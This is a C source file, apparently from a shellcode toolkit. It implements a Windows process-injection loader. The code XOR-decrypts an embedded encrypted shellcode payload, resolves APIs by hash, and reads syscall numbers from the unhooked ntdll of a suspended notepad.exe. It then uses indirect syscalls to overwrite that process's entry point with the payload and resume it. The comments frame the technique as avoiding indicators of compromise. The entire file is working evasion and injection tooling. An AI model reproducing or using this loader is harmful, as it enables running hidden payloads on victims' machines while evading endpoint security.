#include "Shellcode-Toolkit.h"
#include "Structures.h"

// Functions in IndirectSyscaller.S
extern void IndirectSetup(unsigned int ServiceNumber, void *SyscallInstruction);
extern unsigned long long IndirectSystemCall(...);

// Macro to call an indirect syscall
#define IndirectSyscall(Service_Number, Syscall_Instruction, ...) \
({ \
	IndirectSetup(Service_Number, Syscall_Instruction); \
	IndirectSystemCall(__VA_ARGS__); \
})

// Find a syscall instruction in a target syscall stub based on the search distance
static void *GetSyscallInstruction(void *Export_Address, int Max_Search_Distance)
{
	unsigned char *Address = Export_Address;
	for (unsigned int Index = 0; Index < Max_Search_Distance; ++Index)
	{
		// Check if it is a syscall instruction (0F05)
		if (Address[Index] == 0x0F && Address[Index+1] == 0x05)
		{
			void *Syscall_Instruction = (Address + Index);
			return Syscall_Instruction;
		}
	}
	// Return 0 if nothing found
	return 0;
}

// Important strings
createstring char The_printf_Library[]      = "MSVCRT";
createstring char Process_To_Suspend[]      = "notepad.exe";

// Info printing
createstring char Print_All_SysNumbers[]    = "%s: 0x%x\n";
createstring char Print_Sys_Info[]          = "\nNtQueryInformationProcess:  number: 0x%x  address: 0x%p\nNtReadVirtualMemory:        number: 0x%x  address: 0x%p\nNtProtectVirtualMemory:     number: 0x%x  address: 0x%p\nNtWriteVirtualMemory:       number: 0x%x  address: 0x%p\nNtResumeThread:             number: 0x%x  address: 0x%p\n\n";
createstring char Print_Entry_Point[]       = "Main module entry point: 0x%p\n";

// Syscall error debugging
createstring char Invalid_Syscall_Data[]    = "ERROR: A syscall number or instruction was invalid";
createstring char Protect_Status_Success1[] = "Successfully set entry point protection to RW (Old protection = 0x%lx)\n";
createstring char Protect_Status_Fail1[]    = "ERROR: Failed to set entry point protection, status=0x%08lx\n";
createstring char Write_Status_Success[]    = "Successfully wrote the payload to the entry point, (Wrote %llu bytes)\n";
createstring char Write_Status_Fail[]       = "ERROR: Failed to write the payload, status=0x%08lx, wrote=%llu expected=%zu\n";
createstring char Protect_Status_Success2[] = "Successfully restored entry point protection to RX (Old protection = 0x%lx)\n";
createstring char Protect_Status_Fail2[]    = "ERROR: Failed to restore entry point protection, status=0x%08lx\n";
createstring char Resume_Status_Success[]   = "Resumed the thread and executed the payload!\n";
createstring char Resume_Status_Fail[]      = "ERROR: Failed to resume the thread, status=0x%08lx\n";

// The encrypted shellcode
createstring unsigned char Encrypted_Shellcode[] = { 0xcf,0x61,0xb7,0x84,0xe3,0x77,0x0c,0xe6,0x7e,0xcc,0x86,0x3f,0x87,0xaa,0xd0,0xec,0x9e,0x73,0x0a,0xaa,0x7b,0xe4,0x0d,0x7f,0xa7,0xab,0x62,0x6d,0xf2,0x0c,0xcb,0x69,0x1b,0xfc,0x3c,0x50,0xa3,0xe2,0x5b,0xca,0xc7,0xb4,0x8f,0x84,0xde,0x65,0xf2,0x31,0xec,0x30,0x7e,0xa3,0x30,0xf6,0xce,0x61,0x9b,0xae,0x87,0xf5,0x6c,0x0b,0xda,0x56,0xd5,0xbd,0x16,0x94,0x2e,0xaa,0xce,0xb4,0xcf,0xc2,0xb0,0xab,0xce,0xb4,0x87,0x09,0x93,0x9d,0x4f,0x85,0x86,0xcd,0xc1,0xbf,0x6e,0x0c,0x87,0xe2,0x5b,0xe4,0x0b,0x32,0x5c,0xe2,0x5b,0xac,0x79,0xef,0x3d,0xf4,0x38,0x5c,0x5b,0x77,0x0e,0x23,0xb3,0xb1,0x86,0x3f,0x87,0xa7,0x6a,0x65,0xb7,0xf6,0xcb,0x6f,0x5e,0x1d,0x86,0x3f,0x87,0xaa,0xd6,0xb9,0x1c,0x3f,0x87,0xe2,0xa4,0x7c,0xb7,0xff,0xcf,0x61,0x9f,0x84,0x45,0xaf,0xd1,0xa3,0xd2,0x7f,0xce,0xb6,0x4f,0xb1,0xd0,0xfd,0xba,0x77,0x0a,0xb6,0x4a,0xb4,0xe0,0xbe,0xbd,0xe9,0x59,0xd9,0x83,0xb4,0xd5,0x92,0xb0,0xaf,0x0d,0x6d,0xe7,0xaa,0x5a,0x6e,0xb7,0xf6,0x0c,0xb8,0x43,0x27,0xf4,0x1f,0xbe,0x3b,0x2f,0xf7,0xc2,0xb2,0x83,0x6f,0x5b,0xac,0x86,0x3f,0xce,0xe3,0x9b,0xe9,0x0d,0x33,0xb7,0xa3,0xe3,0xc3,0xa2,0x3f,0x87,0xab,0x5a,0x6d,0xc3,0x30,0x31,0xf3,0x1e,0x28,0x54,0x4b,0x8b,0xa7,0x30,0x6c,0xa3,0x76,0x78,0x23,0x1e,0xad,0x56,0xd4,0x6c,0xa7,0x62,0x6f,0xf3,0x1a,0xc3,0x69,0x19,0x88,0x87,0xf6,0xce,0xe3,0x9b,0xed,0x89,0x88,0x8b,0xea,0x1f,0x27,0xc4,0x23,0x46,0x03,0x59,0xe4,0xe5,0xf6,0xcf,0x6f,0x4f,0xa4,0xc4,0xb4,0x93,0xe0,0x13,0xad,0x56,0xd4,0x81,0x1d,0x9a,0x47,0x27,0x0e,0x47,0xb9,0x05,0x6f,0x16,0xaf,0xcf,0x87,0x37,0xc0,0xe9,0x13,0xa7,0x95,0x34,0xde,0xea,0x5b,0xa6,0xe2,0x5b,0xac,0xd5,0x57,0xe2,0x8e,0x37,0xcf,0xe9,0x5b,0xe2,0xc2,0x0f,0xc9,0xf5,0x4b,0x87,0xb7,0x08,0xe9,0xd4,0x0c,0xb5,0xe2,0x5b,0xac,0x86,0x3f,0x87,0xe2,0x5b,0xac,0x86,0x3f };

// Key to decrypt the shellcode
createstring unsigned char XOR_Key[] = { 0x87,0xe2,0x5b,0xac,0x86,0x3f };

int main()
{
	// Decrypt the shellcode
	unsigned long long Shellcode_Size = sizeof(Encrypted_Shellcode);
	unsigned char Shellcode[Shellcode_Size];
	int Index;
	for (Index = 0; Index < Shellcode_Size; ++Index)
	{
		Shellcode[Index] = Encrypted_Shellcode[Index] ^ XOR_Key[Index % (sizeof XOR_Key)];
	}

	// Get the addresses of the main modules
	void *Address_PEB      = GetPEBAddress();
	void *Address_KERNEL32 = GetModuleAddress(Address_PEB, 0x76918253); // "KERNEL32.DLL"
	void *Address_NTDLL    = GetModuleAddress(Address_PEB, 0x5602B4CB); // "ntdll.dll"
	if (!Address_KERNEL32 || !Address_NTDLL)
	{
		return 1;
	}

	// Hashes we will use to get the syscall address and number for the target functions
	unsigned int Hash_NtQueryInformationProcess = 0x50122FD8;
	unsigned int Hash_NtReadVirtualMemory       = 0x2B7E6D3D;
	unsigned int Hash_NtProtectVirtualMemory    = 0xFBCC248A;
	unsigned int Hash_NtWriteVirtualMemory      = 0xCD088B18;
	unsigned int Hash_NtResumeThread            = 0xD949F44E;

	// Get the addresses for the target functions
	void *Address_NtQueryInformationProcess = GetExportAddress(Address_NTDLL, Hash_NtQueryInformationProcess);
	void *Address_NtReadVirtualMemory       = GetExportAddress(Address_NTDLL, Hash_NtReadVirtualMemory);
	void *Address_NtProtectVirtualMemory    = GetExportAddress(Address_NTDLL, Hash_NtProtectVirtualMemory);
	void *Address_NtWriteVirtualMemory      = GetExportAddress(Address_NTDLL, Hash_NtWriteVirtualMemory);
	void *Address_NtResumeThread            = GetExportAddress(Address_NTDLL, Hash_NtResumeThread);

	// Get the syscall instruction for the target function (For indirect syscalls)
	// It is an IoC if we do not use the correct syscall instruction for the target function, so we will target the correct one
	// If the entire syscall stub has been obfuscated, we will have to use the next one along
	unsigned int Search_Distance = 512;
	void *SysAddress_NtQueryInformationProcess = GetSyscallInstruction(Address_NtQueryInformationProcess, Search_Distance);
	void *SysAddress_NtReadVirtualMemory       = GetSyscallInstruction(Address_NtReadVirtualMemory,       Search_Distance);
	void *SysAddress_NtProtectVirtualMemory    = GetSyscallInstruction(Address_NtProtectVirtualMemory,    Search_Distance);
	void *SysAddress_NtWriteVirtualMemory      = GetSyscallInstruction(Address_NtWriteVirtualMemory,      Search_Distance);
	void *SysAddress_NtResumeThread            = GetSyscallInstruction(Address_NtResumeThread,            Search_Distance);

	// Get required functions
	Type_CreateProcessA CreateProcessA       = (Type_CreateProcessA)   GetExportAddress(Address_KERNEL32, 0x9D168917); // "CreateProcessA"
	Type_ReadProcessMemory ReadProcessMemory = (Type_ReadProcessMemory)GetExportAddress(Address_KERNEL32, 0x664F2F2B); // "ReadProcessMemory"
	Type_LoadLibraryA LoadLibraryA           = (Type_LoadLibraryA)     GetExportAddress(Address_KERNEL32, 0x139A2F01); // "LoadLibraryA"

	// Load the old C stdlib runtime so we can get printf (We are so optimized no runtime is loaded by default)
	void *Address_MSVCRT = LoadLibraryA(The_printf_Library);
	Type_printf printf = (Type_printf)GetExportAddress(Address_MSVCRT, 0x9EBC18B6); // "printf"

	// Create the suspended process
	PROCESS_INFORMATION Process_Info;
	STARTUPINFOA Startup_Info = {0};
	Startup_Info.cb = sizeof(Startup_Info);
	CreateProcessA(0, Process_To_Suspend, 0, 0, 0, 0x00000004 | 0x08000000, 0, 0, &Startup_Info, &Process_Info);

	// NTDLL base of the new suspended process should be the same as this process.
	// Read the DOS header of the suspended NTDLL
	void *Process_Handle = Process_Info.hProcess;
	unsigned char NTDLL_DOS_Header[0x40];
	ReadProcessMemory(Process_Handle, Address_NTDLL, NTDLL_DOS_Header, sizeof(NTDLL_DOS_Header), 0);

	// Read the PE header
	unsigned long NTDLL_PE_Header = *(NTDLL_DOS_Header + 0x3C);
	unsigned char Header_Data[0x200];
	ReadProcessMemory(Process_Handle, (Address_NTDLL + NTDLL_PE_Header), Header_Data, sizeof(Header_Data), 0);

	// Read the Export Directory
	unsigned long Export_Address = *(unsigned long*)(Header_Data + 0x88);
	unsigned char Export_Directory[0x40];
	ReadProcessMemory(Process_Handle, (Address_NTDLL + Export_Address), Export_Directory, sizeof(Export_Directory), 0);

	// 64 should be long enough to survive the feared NtConvertBetweenAuxiliaryCounterAndPerformanceCounter
	char Export_Name_Buffer[64];
	unsigned short Ordinal = 0;
	unsigned int Name_Address = 0;
	unsigned int Function_Address = 0;

	// Service numbers we will need later
	unsigned int SysNumber_NtQueryInformationProcess;
	unsigned int SysNumber_NtReadVirtualMemory;
	unsigned int SysNumber_NtProtectVirtualMemory;
	unsigned int SysNumber_NtWriteVirtualMemory;
	unsigned int SysNumber_NtResumeThread;

	// Go through the export directory
	unsigned int Number_Of_Names = *(unsigned int*)(Export_Directory + 0x18);
	unsigned int Number_Of_Functions = *(unsigned int*)(Export_Directory + 0x14);
	unsigned int Address_Of_Functions = *(unsigned int*)(Export_Directory + 0x1C);
	unsigned int Address_Of_Names = *(unsigned int*)(Export_Directory + 0x20);
	unsigned int Address_Of_Ordinals = *(unsigned int*)(Export_Directory + 0x24);
	unsigned int Names_Array[Number_Of_Names];
	unsigned short Ordinals_Array[Number_Of_Names];
	unsigned int Functions_Array[Number_Of_Functions];

	// Read AddressOfNames, AddressOfNameOrdinals and AddressOfFunctions
	ReadProcessMemory(Process_Handle, (Address_NTDLL + Address_Of_Names), Names_Array, (Number_Of_Names * sizeof(unsigned long)), 0);
	ReadProcessMemory(Process_Handle, (Address_NTDLL + Address_Of_Ordinals), Ordinals_Array, (Number_Of_Names * sizeof(unsigned short)), 0);
	ReadProcessMemory(Process_Handle, (Address_NTDLL + Address_Of_Functions), Functions_Array, (Number_Of_Functions * sizeof(unsigned long)), 0);

	// Loop to find every syscall number in the suspended process's NTDLL
	for (unsigned int Index = 0; Index < Number_Of_Names; ++Index)
	{
		Name_Address = Names_Array[Index];

		// Read full name
		ReadProcessMemory(Process_Handle, (void*)(Address_NTDLL + Name_Address), Export_Name_Buffer, (sizeof(Export_Name_Buffer) - 1), 0);

		// Skip every other NTDLL export
		if (Export_Name_Buffer[0] != 'N' || Export_Name_Buffer[1] != 't') continue;
		if (Export_Name_Buffer[2] == 'd') continue;

		Ordinal = Ordinals_Array[Index];
		Function_Address = Functions_Array[Ordinal];

		unsigned char Function_Code[32];
		ReadProcessMemory(Process_Handle, (Address_NTDLL + Function_Address), Function_Code, sizeof(Function_Code), 0);

		// Extract the syscall number, this offset should work correctly as the functions wont be hooked
		unsigned int Service_Number = *(unsigned int*)(Function_Code + 4);

		// Calculate the hash and see if any syscall numbers should be stored for later use
		unsigned int Name_Hash = HashASCII(Export_Name_Buffer);
		if (Name_Hash == Hash_NtQueryInformationProcess) SysNumber_NtQueryInformationProcess = Service_Number;
		if (Name_Hash == Hash_NtReadVirtualMemory) SysNumber_NtReadVirtualMemory = Service_Number;
		if (Name_Hash == Hash_NtProtectVirtualMemory) SysNumber_NtProtectVirtualMemory = Service_Number;
		if (Name_Hash == Hash_NtWriteVirtualMemory) SysNumber_NtWriteVirtualMemory = Service_Number;
		if (Name_Hash == Hash_NtResumeThread) SysNumber_NtResumeThread = Service_Number;

		// Print every syscall number in the suspended process
		printf(Print_All_SysNumbers, Export_Name_Buffer, Service_Number);
	}

	// There is a certain syscall number that is 0, but none of the syscalls we are using should be like that.
	if (!SysAddress_NtQueryInformationProcess || !SysAddress_NtReadVirtualMemory || !SysAddress_NtProtectVirtualMemory || !SysAddress_NtWriteVirtualMemory || !SysAddress_NtResumeThread || !SysNumber_NtQueryInformationProcess || !SysNumber_NtReadVirtualMemory || !SysNumber_NtProtectVirtualMemory || !SysNumber_NtWriteVirtualMemory || !SysNumber_NtResumeThread)
	{
		printf(Invalid_Syscall_Data);
		return 2;
	}

	// Print the number and address for all the syscalls we will be using
	printf(Print_Sys_Info, SysNumber_NtQueryInformationProcess, SysAddress_NtQueryInformationProcess, SysNumber_NtReadVirtualMemory, SysAddress_NtReadVirtualMemory, SysNumber_NtProtectVirtualMemory, SysAddress_NtProtectVirtualMemory, SysNumber_NtWriteVirtualMemory, SysAddress_NtWriteVirtualMemory, SysNumber_NtResumeThread, SysAddress_NtResumeThread);

	// Get the remote PEB
	PROCESS_BASIC_INFORMATION Basic_Information;
	unsigned long Return_Length = 0;
	long Status;
	IndirectSyscall(SysNumber_NtQueryInformationProcess, SysAddress_NtQueryInformationProcess, Process_Info.hProcess, 0, &Basic_Information, sizeof(Basic_Information), &Return_Length);

	// Get the main module base
	unsigned long long Image_Base = 0;
	unsigned long long Byte_Read = 0;
	IndirectSyscall(SysNumber_NtReadVirtualMemory, SysAddress_NtReadVirtualMemory, Process_Info.hProcess, (Basic_Information.PebBaseAddress + 0x10), &Image_Base, sizeof(unsigned long long), &Byte_Read);

	// Get the DOS header
	unsigned char DOS_Header[0x200];
	IndirectSyscall(SysNumber_NtReadVirtualMemory, SysAddress_NtReadVirtualMemory, Process_Info.hProcess, Image_Base, DOS_Header, sizeof(DOS_Header), &Byte_Read);

	// Find the entry point
	unsigned long PE_Header = *(unsigned long*)(DOS_Header + 0x3C);
	unsigned long Address_Of_Entry_Point = *(unsigned long*)(DOS_Header + PE_Header + 40);
	unsigned long long Entry_Point = Image_Base + (unsigned long long)Address_Of_Entry_Point;

	// Print the entry point of the main module
	printf(Print_Entry_Point, Entry_Point);

	// Set the entry point to RW protection
	void *Protect_Address = (void*)Entry_Point;
	unsigned long long Protect_Size = Shellcode_Size;
	unsigned long long Old_Protect = 0;
	Status = IndirectSyscall(SysNumber_NtProtectVirtualMemory, SysAddress_NtProtectVirtualMemory, Process_Info.hProcess, &Protect_Address, &Protect_Size, 0x04, &Old_Protect);
	if (Status >= 0) {
		printf(Protect_Status_Success1, Old_Protect);
	} else {
		printf(Protect_Status_Fail1, Status);
		return 3;
	}

	// Write the shellcode to the entry point
	unsigned long long Bytes_Written = 0;
	Status = IndirectSyscall(SysNumber_NtWriteVirtualMemory, SysAddress_NtWriteVirtualMemory, Process_Info.hProcess, Entry_Point, Shellcode, Shellcode_Size, &Bytes_Written);
	if (Status >= 0 && Bytes_Written == Shellcode_Size) {
		printf(Write_Status_Success, Bytes_Written);
	} else {
		printf(Write_Status_Fail, Status, Bytes_Written, Shellcode_Size);
		return 3;
	}

	// Restore the original protection of the entry point (RX)
	Protect_Address = (void*)Entry_Point;
	Protect_Size = Shellcode_Size;
	Status = IndirectSyscall(SysNumber_NtProtectVirtualMemory, SysAddress_NtProtectVirtualMemory, Process_Info.hProcess, &Protect_Address, &Protect_Size, Old_Protect, &Old_Protect);
	if (Status >= 0) {
		printf(Protect_Status_Success2, Old_Protect);
	} else {
		printf(Protect_Status_Fail2, Status);
		return 3;
	}

	// Resume the suspended process and execute the injected code
	Status = IndirectSyscall(SysNumber_NtResumeThread, SysAddress_NtResumeThread, Process_Info.hThread, 0);
	if (Status >= 0) {
		printf(Resume_Status_Success);
	} else {
		printf(Resume_Status_Fail, Status);
		return 3;
	}

	return 0;
}
